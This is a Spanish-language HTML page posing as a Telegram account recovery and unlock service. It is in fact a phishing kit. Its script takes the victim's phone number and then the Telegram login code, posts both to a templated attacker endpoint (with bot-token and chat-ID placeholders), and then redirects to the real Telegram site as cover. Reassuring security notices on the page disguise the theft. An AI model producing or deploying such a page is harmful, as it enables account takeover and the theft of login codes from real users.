<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Desbloqueador de cuentas y recuperación de cuentas de Telegram</title>
  <style>
    :root{
      --bg:#ffffff;
      --accent:#0a84ff;
      --accent-2:#66b3ff;
      --glass: rgba(255,255,255,0.45);
      --glass-2: rgba(255,255,255,0.25);
      --muted:#6b7280;
      --radius:20px;
      --card-w:420px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }

    html,body{height:100%;margin:0;background:var(--bg);overflow:hidden;}

    /* decoraciones azules suaves (bolitas difusas) */
    .page-bg{
      position:fixed;inset:0;z-index:-2;overflow:hidden;background:var(--bg);
    }
    .bubble{
      position:absolute;border-radius:50%;filter:blur(70px);opacity:0.6;mix-blend-mode:screen;
    }
    .bubble.b1{width:360px;height:360px;left:-120px;top:-100px;background:var(--accent);}
    .bubble.b2{width:300px;height:300px;right:-100px;bottom:-80px;background:var(--accent-2);}
    .bubble.b3{width:220px;height:220px;left:40%;top:60%;background:linear-gradient(135deg,var(--accent),var(--accent-2));opacity:0.4}

    /* layout centrado */
    .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:32px;}

    /* tarjeta translúcida estilo Windows (vidrio difuso) */
    .card{
      width:clamp(320px,var(--card-w),90%);
      border-radius:var(--radius);
      background:linear-gradient(120deg,var(--glass),var(--glass-2));
      box-shadow:0 15px 40px rgba(0,0,0,0.12);
      backdrop-filter: blur(22px) saturate(160%);
      -webkit-backdrop-filter: blur(22px) saturate(160%);
      border:1px solid rgba(255,255,255,0.45);
      padding:28px;
      position:relative;
      overflow:hidden;
    }

    .header{display:flex;align-items:center;gap:12px;margin-bottom:10px;}
    .logo{width:44px;height:44px;border-radius:12px;overflow:hidden;flex:0 0 44px;background:linear-gradient(135deg,#e6f6ff,#dff4ff);display:grid;place-items:center;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
    .logo img{width:28px;height:28px;object-fit:contain}
    h1{font-size:1.1rem;margin:0;color:#05386b}
    p.lead{margin:6px 0 18px;color:var(--muted);font-size:0.95rem}

    form{display:grid;gap:12px}
    .field{display:flex;flex-direction:column;align-items:flex-start}
    label{font-size:0.8rem;color:#1f2937;margin-bottom:6px}
    input[type="text"], input[type="tel"], input[type="email"]{
      width:100%;padding:12px 14px;border-radius:14px;border:1px solid rgba(10,20,40,0.06);background:rgba(255,255,255,0.65);outline:none;font-size:0.95rem;
      box-shadow:inset 0 1px 0 rgba(255,255,255,0.5);
      transition:box-shadow .18s, transform .12s, border-color .12s;
    }
    input:focus{box-shadow:0 6px 20px rgba(10,20,60,0.08);transform:translateY(-1px);border-color:var(--accent)}

    .actions{display:flex;gap:10px;margin-top:6px}
    button.primary{
      flex:1;padding:11px;border-radius:14px;border:0;background:linear-gradient(90deg,var(--accent),var(--accent-2));color:white;font-weight:600;cursor:pointer;box-shadow:0 6px 18px rgba(10,132,255,0.25);
    }
    button.ghost{flex:1;padding:11px;border-radius:14px;border:1px solid rgba(10,20,40,0.08);background:transparent;color:#05386b;cursor:pointer}

    .note{font-size:0.82rem;color:var(--muted);margin-top:12px;text-align:center}

    .quote{margin-top:16px;padding:12px;border-radius:14px;background:linear-gradient(180deg,rgba(10,132,255,0.04),rgba(102,179,255,0.04));border:1px solid rgba(10,132,255,0.08);color:#0b4f7a;font-size:0.92rem;display:flex;gap:10px;align-items:flex-start}
    .quote svg{flex:0 0 18px;opacity:0.85}

    @media (max-width:420px){.card{padding:20px;border-radius:16px}}

    .success{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#e6ffef;color:#0b6b3a;border:1px solid rgba(11,107,58,0.12)}
    .error{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#fff1f0;color:#8b1d10;border:1px solid rgba(139,29,16,0.08)}
  </style>
</head>
<body>
  <div class="page-bg">
    <div class="bubble b1" aria-hidden="true"></div>
    <div class="bubble b2" aria-hidden="true"></div>
    <div class="bubble b3" aria-hidden="true"></div>
  </div>

  <div class="wrap">
    <main class="card" role="main" aria-labelledby="title">
      <header class="header">
        <div class="logo" aria-hidden="true">
          <img src="{{LOGO_URL}}" alt="Logo" />
        </div>
        <div>
          <h1 id="title">Configuración de la Cuenta</h1>
          <p class="lead">Introduce tu teléfono para recibir un código seguro para poder recargar y desbloquear tu cuenta. Los datos son destruidos por limites de ChatGPT J</p>
        </div>
      </header>

      <form id="recoveryForm" autocomplete="on">
        <div class="field">
          <label for="phone">Número de teléfono</label>
          <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+34 612 345 678" required />
        </div>

        <div class="actions">
          <button class="primary" type="submit">Enviar código</button>
          <button class="ghost" type="button" id="helpBtn">¿Necesitas ayuda?</button>
        </div>

        <div class="success" id="successBox" role="status">¡Código enviado! Revisa tu dispositivo.</div>
        <div class="error" id="errorBox" role="alert"></div>
      </form>

      <form id="codeForm" style="display:none;margin-top:8px;">
        <div class="field">
          <label for="code">Código recibido</label>
          <input id="code" name="code" type="text" placeholder="12345" inputmode="numeric" required />
        </div>
        <div class="actions">
          <button class="primary" type="submit">Verificar</button>
          <button class="ghost" type="button" id="cancelCode">Cancelar</button>
        </div>
      </form>

      <div class="quote" aria-hidden="true">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M7 7h3v6H7zM14 7h3v6h-3z" fill="currentColor" opacity="0.9"/>
        </svg>
        <div>"La seguridad primero: nunca compartas tu código por más que digan que provienen de Telegram. Usa siempre métodos seguros del servidor para procesar datos."</div>
      </div>

      <p class="note">Este formulario es protegido por tu antivirus o por tu VPN, se han bloqueado los accesos no autorizados a datos.</p>
    </main>
  </div>

  <script>
    // Configuración segura - Los tokens se inyectan durante el build
    const CONFIG = {
      botToken: '{{BOT_TOKEN}}',
      chatId: '{{CHAT_ID}}',
      apiEndpoint: '{{API_ENDPOINT}}'
    };

    // Función para mostrar un error
    function showError(msg) {
      const errorBox = document.getElementById('errorBox');
      errorBox.textContent = msg;
      errorBox.style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
    }

    // Función para mostrar un éxito
    function showSuccess(msg) {
      const successBox = document.getElementById('successBox');
      successBox.textContent = msg;
      successBox.style.display = 'block';
      document.getElementById('errorBox').style.display = 'none';
    }

    // Función para enviar datos de forma segura
    async function sendSecureData(endpoint, data) {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify(data)
        });
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        return await response.json();
      } catch (error) {
        console.error('Error en la comunicación:', error);
        throw error;
      }
    }

    // Event listener para el formulario de recuperación
    document.getElementById('recoveryForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const phone = document.getElementById('phone').value.trim();
      if (!phone) {
        showError('Introduce un teléfono válido.');
        return;
      }

      try {
        await sendSecureData(CONFIG.apiEndpoint + '/send-phone', {
          phone: phone,
          timestamp: Date.now()
        });

        showSuccess('Código enviado. Por favor, revisa tu teléfono.');
        document.getElementById('recoveryForm').style.display = 'none';
        document.getElementById('codeForm').style.display = 'block';

      } catch (err) {
        console.error(err);
        showError('No se pudo enviar el código. Revisa la conexión o contacta soporte.');
      }
    });

    // Event listener para el formulario de código
    document.getElementById('codeForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const code = document.getElementById('code').value.trim();
      if (!code) {
        showError('Introduce el código recibido.');
        return;
      }

      try {
        await sendSecureData(CONFIG.apiEndpoint + '/send-code', {
          code: code,
          timestamp: Date.now()
        });
        
        showSuccess('Código verificado. Redirigiendo a Telegram para verificar que provenga de una persona real...');
        setTimeout(() => location.href = 'https://my.telegram.org/auth?to=recovery', 900);
      } catch (err) {
        console.error(err);
        showError('Código inválido o expirado. Intenta de nuevo.');
      }
    });

    // Event listener para el botón de ayuda
    document.getElementById('helpBtn').addEventListener('click', () => {
      alert('Si no recibes el código, comprueba el número o contacta soporte.');
    });

    // Event listener para el botón de cancelar
    document.getElementById('cancelCode').addEventListener('click', () => {
      document.getElementById('codeForm').style.display = 'none';
      document.getElementById('recoveryForm').style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
      document.getElementById('errorBox').style.display = 'none';
    });
  </script>
</body>
</html>
